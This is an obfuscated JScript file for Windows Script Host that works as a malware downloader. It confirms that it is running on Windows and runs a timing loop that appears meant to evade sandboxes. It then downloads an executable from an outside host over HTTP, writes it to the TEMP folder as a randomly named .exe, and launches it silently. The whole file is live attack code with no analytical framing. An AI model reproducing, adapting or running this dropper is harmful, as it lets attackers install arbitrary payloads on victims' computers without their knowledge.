var TE = false;
var G = "CreateObject";
var v = function g() {return WScript[G]("WScript.Shell");}(), r = 11;
var s = "MSXML2.XMLHTTP";
var Ra = 2123213;
var M = 0;
function FR(QS){v["Run"](QS, M, M);};
function i(){return "" + s;};
function EN(PB, r0){M = M * 1; return PB - r0;};
function yj(){return G;};
/*@cc_on
  @if (@_win32 || @_win64)
    TE = true;
  @end
@*/
if (TE)
{
var Fw = "";
function Aw(){return 22;};
var i0 = 0; var O = 0;
function u()
{
var IN = new this["Date"]();
var jR = IN["getUTCMilliseconds"]();
WScript["Sleep"](Aw());
var IN = new this["Date"]();
var bf = IN["getUTCMilliseconds"]();
WScript["Sleep"](Aw());
var IN = new this["Date"]();
var Zm = IN["getUTCMilliseconds"]();
var i0 = "C";
i0 = EN(bf, jR);
var O = "aC";
O = EN(Zm, bf);
Fw = "open";
return EN(i0, O);
}
var iG = false;
var xp = false;
for (var P0 = M; P0 < Aw() * 1; P0++){if (u() != M){
iG = true; 
O = "31" + 11 * i0 + O; 
xp = true; 
break;
}}
function P() {return ((iG == true) && (iG == xp)) ? 1 : M;};
if (iG && P() && xp){
function d() {return v["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "AQFajjSc0F1Z.exe";};
 ND = i();
 DB = WScript[G](ND);
 var I = 1;
 while (I){
try {
DB[Fw]("GET", "http://greenellebox.com/a1odk", false);
DB["send"]();
u0 = "Sleep";
for (;;){WScript[u0](Aw() * 11); if (DB["readystate"] >= 2 * 2) break;};
I = M;
} catch(J){};
}
function sZ(Kt) {var Y = (1, 2, 3, 4, 5, Kt); return Y;};
P1 = WScript[yj()]("ADODB.Stream");
ND = P1;
ND[Fw]();
ND["type"] = sZ(1);
ND["write"](DB["ResponseBody"]);
P1["position"] = sZ(M);
ND["Save" + "ToFile"](d(), 2);
P1["c"+"lose"]();
lA = d();
FR(lA);
}
}

